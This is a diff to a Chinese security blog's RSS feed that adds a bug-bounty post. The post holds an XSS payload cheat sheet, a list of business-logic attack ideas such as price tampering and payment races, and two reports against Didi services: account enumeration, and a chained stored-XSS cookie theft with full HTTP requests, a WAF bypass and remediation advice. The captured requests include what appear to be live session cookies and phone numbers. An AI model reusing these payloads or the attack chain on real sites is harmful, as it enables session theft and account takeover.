@@ -3351,6 +3351,217 @@ root@localhost&apos;s password:
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
+</content:encoded></item><item><title>src漏洞挖掘之旅</title><link>https://picoorg.github.io/posts/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E6%97%85/</link><guid isPermaLink="true">https://picoorg.github.io/posts/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E6%97%85/</guid><pubDate>Mon, 03 Mar 2025 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
+&lt;li&gt;XXE&lt;/li&gt;
+&lt;li&gt;XSS：存储、反射、dom、pdf/svg&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;# 基础利用
+&amp;lt;svg/onload=alert(1)&amp;gt;
+&amp;lt;img src=x onerror=alert(1)&amp;gt;
+&amp;lt;a href=&quot;javascript:alert(1)&quot; &amp;gt;click me&amp;lt;/a&amp;gt;
+&amp;lt;a href=&apos;data:text/html;base64,YWxlcnQoMSkK&apos;&amp;gt;click here&amp;lt;/a&amp;gt;
+&amp;lt;iframe src=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;gt;
+
+# 闭合环境
+&apos;&quot;&amp;gt;&amp;lt;svg/onload=alert(1)//
+
+&amp;lt;iframe src=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;gt;
+&amp;lt;iframe src=&amp;amp;#x0006A&amp;amp;#x00061&amp;amp;#x00076&amp;amp;#x00061&amp;amp;#x00073&amp;amp;#x00063&amp;amp;#x00072&amp;amp;#x00069&amp;amp;#x00070&amp;amp;#x00074&amp;amp;#x0003A&amp;amp;#x00061&amp;amp;#x0006C&amp;amp;#x00065&amp;amp;#x00072&amp;amp;#x00074&amp;amp;#x00028&amp;amp;#x00031&amp;amp;#x00029&amp;gt;
+&amp;lt;a href=&quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&amp;gt;test&amp;lt;/a&amp;gt;
+&amp;lt;script src=//ﬀﬀ.pw&amp;gt;
+&amp;lt;script src=//01.x🅍.ht&amp;gt;
+
+&amp;lt;script&amp;gt;/*
+*/alert/*
+*/(document/*
+*/.cookie)/*
+*/&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;CORS：&lt;/li&gt;
+&lt;li&gt;CSRF：&lt;/li&gt;
+&lt;li&gt;RCE：electron、log4shell、shiro&lt;/li&gt;
+&lt;li&gt;sql注入：
+&lt;ul&gt;
+&lt;li&gt;order by：if(1=1,1,sleep(1))&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;注册：&lt;/li&gt;
+&lt;li&gt;登陆：&lt;/li&gt;
+&lt;li&gt;越权：
+&lt;ul&gt;
+&lt;li&gt;不应该具备的权限：送餐超出配送&lt;/li&gt;
+&lt;li&gt;权限控制被绕过：付费漫画免费看&lt;/li&gt;
+&lt;li&gt;垂直越权特权提升：踢人，无限禁言&lt;/li&gt;
+&lt;li&gt;水平越权：登陆，操作别人订单，修改资料，修改评价&lt;/li&gt;
+&lt;li&gt;未授权&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;交易：
+&lt;ul&gt;
+&lt;li&gt;金额修改，0.01，0，小数，正负值（A为-1，B为2，总值为1）绕过综合校验&lt;/li&gt;
+&lt;li&gt;下溢出，负数&lt;/li&gt;
+&lt;li&gt;上溢出，单件x件数，1073741824&lt;/li&gt;
+&lt;li&gt;金额取整，1.9999&lt;/li&gt;
+&lt;li&gt;ID替换：订单，优惠券，礼物&lt;/li&gt;
+&lt;li&gt;并发送礼物，抽奖&lt;/li&gt;
+&lt;li&gt;取货时并发&lt;/li&gt;
+&lt;li&gt;支付并发：钱包支付总数超过余额，并发转账&lt;/li&gt;
+&lt;li&gt;替换订单：创建订单号如果订单状态可修改，先进到支付界面，然后将订单修改成更大的金额，然后支付提前进入的支付界面&lt;/li&gt;
+&lt;li&gt;数量修改&lt;/li&gt;
+&lt;li&gt;上架商品突破限制，例如数量，字数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;营销：
+&lt;ul&gt;
+&lt;li&gt;转盘概率越权配置&lt;/li&gt;
+&lt;li&gt;并发创建订单后支付：通过多设备、多账号扫码创建订单，获得首购/签约类交易订单，重复获得优惠&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;直播：
+&lt;ul&gt;
+&lt;li&gt;炸房：快速进出房间，无限发送点赞，发言刷屏，频繁申请取消操作&lt;/li&gt;
+&lt;li&gt;修改弹幕图片&lt;/li&gt;
+&lt;li&gt;越权&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;社交
+&lt;ul&gt;
+&lt;li&gt;强行举报（读取本地消息上传那种）&lt;/li&gt;
+&lt;li&gt;强行加好友（一般尝试重发通过好友这条协议）&lt;/li&gt;
+&lt;li&gt;自由修改号码（靓号类）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;阿里云备案self xss - 未提交&lt;/h2&gt;
+&lt;p&gt;https://beian.aliyun.com/?spm=5176.5176.0.0.6be05fac0eITp1
+&lt;img src=&quot;image.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;【白帽赏金赛】滴滴统一登录内部账号枚举 - 已提交&lt;/h2&gt;
+&lt;p&gt;https://me.xiaojukeji.com/resetPwd.html&lt;/p&gt;
+&lt;p&gt;通过字段username遍历，请求为：&lt;/p&gt;
+&lt;p&gt;POST /password/resetBymsg HTTP/1.1
+Host: me.xiaojukeji.com
+Cookie: _OMGID=7acfde7c-9f31-4f6f-b6d7-6ba88aa9aa02
+Content-Length: 85
+Sec-Ch-Ua-Platform: &quot;macOS&quot;
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;
+Sec-Ch-Ua-Mobile: ?0
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
+Accept: application/json, text/javascript, &lt;em&gt;/&lt;/em&gt;; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: https://me.xiaojukeji.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive&lt;/p&gt;
+&lt;p&gt;newPw1=1qac%40WSV&amp;amp;newPw2=1qac%40WSV&amp;amp;code=000001&amp;amp;verificationCodeMode=3&amp;amp;username=lili&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;存在用户名返回
+&lt;img src=&quot;image-1.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不存在用户名返回
+&lt;img src=&quot;image-2.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;【白帽赏金赛】小桔科技星海系统组合漏洞1-click用户Cookie盗用&lt;/h2&gt;
+&lt;p&gt;1、受影响URL/APP/业务&lt;/p&gt;
+&lt;p&gt;https://page-biz.xiaojukeji.com/xinghai-sale-car&lt;/p&gt;
+&lt;p&gt;2、测试账号及测试时间&lt;/p&gt;
+&lt;p&gt;18222332811
+13391768520
+2025-03-04&lt;/p&gt;
+&lt;p&gt;3、漏洞证明&lt;/p&gt;
+&lt;p&gt;第一步：登陆后任意注册企业，其中企业信息，只需关注companyName，companyCode，companyCorporation三个字段准确性，可以从公开信息查询，爱企查任意企业都可以用来注册&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;image-4.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /xinghai-sale-car/req-proxy/xinghai-sale-car/dop/dmp/company/registerCompany HTTP/2
+Host: page-biz.xiaojukeji.com
+Cookie: user_phone=2811; user_phone.sig=jhrnQJXsg22IFQmbIeORn587uoI; user_uid=117674139898240416; user_uid.sig=KEVHbcQiWzWeanLlYDMvtbkxRkQ; env=prod; env.sig=vpXF4S7kFhH8JjmGk6oZDU0A5QY; passportTicket=EsanIsDsa2leCmce-oE9TOXTD_mLk3M6ZfDZqxIlxegkzDkOwkAMQNG7_NqK7BnPErf03IElLM0ggaii3B2JVK97K0MJ8qSTIgwjTBiJKKqlCiMTKgzfKQSHI8KJAOFMmLXa3PLc555c3apw_TcLsfJ5fd-XhWiqaptwI6y5aVMvLtwJrKeUck7dDOGxz09Ct18AAAD__w==; passportTicket.sig=Zml67OAFqTGweNdOXt9e9sKAtHA; phone=18222332811; phone.sig=ycTbfbUeZG94_bj1QSnznZFjx6A; uid=117674139898240416; uid.sig=dEK44hPfhc5NntEC2lYd6vbOh_s; _OMGID=a797a60a-7818-4e47-9236-8124517c6d4b; ticket=GL8leaoD2neopKaKEnsvqS0r8j3fYzeBasKsVczqQ8kkzDmOg1AMgOG7_LWFbL_F4Hb6ucMsZGlepESpEHePENXXfRtDScqkkyIMI00YTjZVV2EU8qCSFtV6WIkQRiP5-kb4IUH4JefuakvrWlv4EsI_WYWV3Hg93s-_lQxVtV24nJ323o7uSmKzu5fisxnC7WzvpO6fAAAA__8%3D; PASSPORT_TICKET=&quot;yDxNDHWJ_-mXdGYt1L_h0wvVhZKrwlYc8yir_w5NXLUkzDtuwzAQhsG7fPVC2H9JhdS26XOHPJTEDQ3YcCXo7oasbqrZGE5SJp8cY4iUMYKs7jpYSDdGJdWqNNfwMMZM8v6B8UmC8UVKTZL6stQ691iiGT-vbyU37tfH7Xslm7trN37P0d9aP8Y_EvWIKCW6hPF_zhfS92cAAAD__w==&quot;; _OMGID=a797a60a-7818-4e47-9236-8124517c6d4b; __hash__wa=20250304-0-dev-user-2d58a34c-f974-48c1-ba9c-a2aa91556e48; __hash__cache=2d58a34c-f974-48c1-ba9c-a2aa91556e48; user-fingerprint-water-mark=20250304-0-dev-user-2d58a34c-f974-48c1-ba9c-a2aa91556e48
+Content-Length: 288
+Sec-Ch-Ua-Platform: &quot;macOS&quot;
+Wsgsig: dd05-glabdBPNK/e7XfBl3wDhwxVkN6pv0Gl+E1xULX+EuuK+ICo5Pk6ofrW8L0HjV3G/mXFqju/aK9k+jsAj1wDhxSlr4wclGGlJc1SlMbCfS3N66Xf1PkMogUs12s/nq7GnWcFZipOcNlx3sf5T95+wwwEU+ZjZcCx3FHStM0bIo+zJ3Xs9RhVuceRcNbUmV37miWTqjo5e1Aldjt6/HOGvzY2+Apnoc9av+pVhbFucYP35MhpZx9PubdvIIbVTU4g/VbMZn4507BSbZDLn2S4iO6YW31QPEfY2cMZrLn84Sz0MIso2QBExgdnMLc1uU7pXWDevW3hB8/EKWsVVL50/wTZnMHinFjY4cTSk3g40w7v660Q3RheRCas02C5lrN4SXDeuj3YLK9wMjbAm1wgjxTOnHIsmFjk6bYkhMDbpzoC22X+lPr6QFaG01tqnqo4rqtVvhw12+lq3hdYh1LKjwT/VN1WQFWw6B1Yi2C+CZ+4J6ni5QhBqCBy42CAhq7DsWcBujw12+kU3hdYh1LKjwT/VNHJp0f/BB1Un8C8GY+cN3gsbRhABF9RKHc1SQN8VWtaxiJwaIA/KjC1w1SpivTYU+HynFGUAGOr18DbKw8jM6GGLv9MmGry12b5hrNKWWj6VhQS9KAA3qj6rNPuhzYOt+6zwEtx+bMOm3bfgZ3N7Hsm1QrMogUo1MCMXrNpU##KAwFHv3ULAtCQXS0ooOMsHZgPBKJXCXM2EmSAcZSSpOrXJ69yStHok/7Kxv0AlBcFbXFYWIV67WfCzumr1Ejkg==
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;
+Current-Path: https://page-biz.xiaojukeji.com/xinghai-sale-car#/register
+Caller: xinghai
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
+Accept: application/json
+Content-Type: application/json
+Origin: https://page-biz.xiaojukeji.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://page-biz.xiaojukeji.com/xinghai-sale-car
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{&quot;version&quot;:2,&quot;businessId&quot;:4,&quot;companyName&quot;:&quot;广西孔雀西南飞科技发展有限公司&quot;,&quot;companyCode&quot;:&quot;91450103MA5PCAWB50&quot;,&quot;companyCityId&quot;:1,&quot;companyCorporation&quot;:&quot;刘乾生&quot;,&quot;companyCorporationCertificateType&quot;:2,&quot;companyCorporationId&quot;:&quot;111111111111111111&quot;,&quot;registerPhone&quot;:&quot;18222332811&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;image-5.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;第二步：修改用户身份，把企业转让给其他任意手机号如13391768520，并插入XSS Payload，需要绕过WAF&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;image-3.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /xinghai-sale-car/req-proxy/xinghai-sale-car/dop/dmp/merchant/user/manage/operate HTTP/2
+Host: page-biz.xiaojukeji.com
+Cookie: user_phone=2811; user_phone.sig=jhrnQJXsg22IFQmbIeORn587uoI; user_uid=117674139898240416; user_uid.sig=KEVHbcQiWzWeanLlYDMvtbkxRkQ; env=prod; env.sig=vpXF4S7kFhH8JjmGk6oZDU0A5QY; passportTicket=EsanIsDsa2leCmce-oE9TOXTD_mLk3M6ZfDZqxIlxegkzDkOwkAMQNG7_NqK7BnPErf03IElLM0ggaii3B2JVK97K0MJ8qSTIgwjTBiJKKqlCiMTKgzfKQSHI8KJAOFMmLXa3PLc555c3apw_TcLsfJ5fd-XhWiqaptwI6y5aVMvLtwJrKeUck7dDOGxz09Ct18AAAD__w==; passportTicket.sig=Zml67OAFqTGweNdOXt9e9sKAtHA; phone=18222332811; phone.sig=ycTbfbUeZG94_bj1QSnznZFjx6A; uid=117674139898240416; uid.sig=dEK44hPfhc5NntEC2lYd6vbOh_s; _OMGID=a797a60a-7818-4e47-9236-8124517c6d4b; __hash__wa=20250304-0-dev-user-b5ce60c0-e4c6-4ee0-9fe5-25bf82432f5b; __hash__cache=b5ce60c0-e4c6-4ee0-9fe5-25bf82432f5b; user-fingerprint-water-mark=20250304-0-dev-user-b5ce60c0-e4c6-4ee0-9fe5-25bf82432f5b; ticket=GL8leaoD2neopKaKEnsvqS0r8j3fYzeBasKsVczqQ8kkzDmOg1AMgOG7_LWFbL_F4Hb6ucMsZGlepESpEHePENXXfRtDScqkkyIMI00YTjZVV2EU8qCSFtV6WIkQRiP5-kb4IUH4JefuakvrWlv4EsI_WYWV3Hg93s-_lQxVtV24nJ323o7uSmKzu5fisxnC7WzvpO6fAAAA__8%3D;  _OMGID=a797a60a-7818-4e47-9236-8124517c6d4b; __hash__wa=20250304-0-dev-user-9cd108b3-8fe4-4c14-841e-f4c83478f977; __hash__cache=9cd108b3-8fe4-4c14-841e-f4c83478f977; user-fingerprint-water-mark=20250304-0-dev-user-9cd108b3-8fe4-4c14-841e-f4c83478f977
+Content-Length: 279
+Sec-Ch-Ua-Platform: &quot;macOS&quot;
+Wsgsig: dd05-NwPU2kEEs9MLFyG9uoV+8/2LxHHuLzOWDBCSX4cTgjPcepGC70gXIVSfR6KiyrTSEBRyhDZVwWA6aucaZoVM8U1JOLxt+8LtgkGk/7GZCmSGg8oD5C8q6lZCPTXmvVTRdlRX/frXZDIHAy4H/NhG8UP+wI6p34EjBUGs/KfWAt6a983K70nk2E/Iy6jnyrlQAADyhgerpmBGaK3eOuYB5t9Wlwrp6+InNU85hyNpgkEr44nzHhon0BEdzS7noqZyfaghUiTvYG9HfKJBxNLt4F6NwYeRL8EVDk7/VyNYCfOGCzRd7n7/6/VCO1btpAPQak4hjDrWwmIL9pC0vyY56/E1w1LZL3BODEWnhyfvDDxMCpJg2f8tIqZEP64nueAzeVXUhbMswmL1a3XdYNhJ7V2Kx19xM7BwGEsn/77ygjOAc2uI3s+/JmF6PwnlvlUielzvmcFVnXqHE4K+j7r+7leNx1LZM+6/DUbYV7DPfcZcg87B700VHhIEOx0mvewxeens/trVnXqHAKK+j7r+7leNx19zL+FhCUbYV7zrgDVcezGF2gDoIA/Oo5NtQdOU8VzU/chrxfEDaJ+aYyVE8F2NvY5rL8alCE7jVYRrbmMGe8GE2f7qL/BgP6DmvVYZgFXt/DrYxWd7cJ40QpS2H//MzOFR1p1WDBDWXN8odfP9fz30J0JjI9hCw6cppVEXdFpr##8irxLZVHLdlcR0owTwMzvWGDvAPIQOJDJIjvFuvkg4e57Gc9zLw2Zo6kF1ighiQT/Sg5hkZpl25akL4r8r75VA==
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;
+Current-Path: https://page-biz.xiaojukeji.com/xinghai-sale-car#/company/authManage/userManage
+Caller: xinghai
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
+Accept: application/json
+Content-Type: application/json
+Origin: https://page-biz.xiaojukeji.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://page-biz.xiaojukeji.com/xinghai-sale-car
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{&quot;version&quot;:2,&quot;businessId&quot;:4,&quot;id&quot;:234392,&quot;action&quot;:&quot;update_info&quot;,&quot;data&quot;:{&quot;name&quot;:&quot;&amp;lt;a onmouseover=alert(document.cookie)&amp;gt;123&amp;lt;/a&amp;gt;%0a&quot;,&quot;idNo&quot;:&quot;&amp;lt;a onmouseover=alert(1)&amp;gt;123&amp;lt;/a&amp;gt;%0a&quot;,&quot;phone&quot;:&quot;18222332811&quot;,&quot;email&quot;:&quot;&quot;,&quot;roleList&quot;:[200374],&quot;idNoPhoto&quot;:&quot;&quot;,&quot;authLetterPhoto&quot;:&quot;&quot;,&quot;cityIdList&quot;:[]}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;image-6.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;第三步：受害者登陆企业后，查看日志cookie即被盗用。当然除了盗用cookie外，还可以用于钓鱼等利用。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;image-7.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;image-8.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;第四步：此时原账号即可重新注册新的企业，重复前三步骤覆盖更多用户&lt;/p&gt;
+&lt;p&gt;4、修复方案&lt;/p&gt;
+&lt;p&gt;修复以下风险即可&lt;/p&gt;
+&lt;p&gt;第一步：存在企业注册无审核风险&lt;/p&gt;
+&lt;p&gt;第二步：存在用户身份越权赋予风险、XSS漏洞风险、末尾%0a WAF绕过风险&lt;/p&gt;
+&lt;p&gt;第三步：存在用户登陆态cookie passportTicket无httponly保护&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;  &quot;xiaojuchefu.com&quot;,
+  &quot;didialift.com&quot;,
+  &quot;juyanwenjuan.com&quot;,
+  &quot;99app.com&quot;,
+  &quot;99taxis.mobi&quot;,
+  &quot;didichuxing.com&quot;,
+  &quot;didistatic.com&quot;,
+  &quot;kuaidadi.com&quot;,
+  &quot;diditaxi.com.cn&quot;,
+  &quot;udache.com&quot;,
+  &quot;xiaojukeji.com&quot;,
+  &quot;zhonganfengshang.com&quot;,
+  &quot;didimobility.com&quot;,
+  &quot;didiglobal.com&quot;,
+  &quot;didi.cn&quot;,
+  &quot;qingqikeji.com&quot;,
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;参考文献&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.secpulse.com/archives/author/jdsec/page/2&quot;&gt;京东SRC文章列表&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/zha0gongz1/p/12732356.html&quot;&gt;绕过XSS过滤姿势总结&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 </content:encoded></item><item><title>业务安全之反爬对抗</title><link>https://picoorg.github.io/posts/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E7%88%AC%E5%AF%B9%E6%8A%97/</link><guid isPermaLink="true">https://picoorg.github.io/posts/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E7%88%AC%E5%AF%B9%E6%8A%97/</guid><pubDate>Fri, 21 Feb 2025 00:00:00 GMT</pubDate><content:encoded/></item><item><title>业务安全之广告反作弊</title><link>https://picoorg.github.io/posts/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E4%B9%8B%E5%B9%BF%E5%91%8A%E5%8F%8D%E4%BD%9C%E5%BC%8A/</link><guid isPermaLink="true">https://picoorg.github.io/posts/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E4%B9%8B%E5%B9%BF%E5%91%8A%E5%8F%8D%E4%BD%9C%E5%BC%8A/</guid><description>未知攻，焉知防，本文以攻击者视角展开分析业务安全广告反作弊基础内容。</description><pubDate>Fri, 21 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;1. 广告反作弊&lt;/h1&gt;
 &lt;p&gt;广告（英语：advertising或advertizing），从狭义上讲是一种市场营销行为，用于劝说阅听人，通常以引发产品或服务购买，即商业广告。另一方面从广义上认识广告，它是一切为了沟通信息、促进认识的广告传播活动，无论是否作用于商业领域，是否将营利作为运作目标，只要具备广告的基本特征，都是广告活动。&lt;/p&gt;
 &lt;h2&gt;1.1. 互联网广告行业分析&lt;/h2&gt;
